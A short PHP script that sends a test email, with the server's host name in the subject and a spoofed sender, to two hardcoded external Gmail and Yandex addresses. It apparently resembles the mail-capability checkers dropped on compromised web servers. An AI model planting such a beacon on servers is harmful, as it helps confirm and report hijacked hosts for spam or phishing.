<?PHP
$sender = 'someone@somedomain.tld';
$recipient = 'owotosure@gmail.com, wirelog60@yandex.com';

$subject = "php mail 4rm ".$_SERVER['HTTP_HOST'];
$message = "php test message";
$headers = 'From:' . $sender;

if (mail($recipient, $subject, $message, $headers))
{
    echo "Message accepted";
}
else
{
    echo "Error: Message not accepted";
}
?>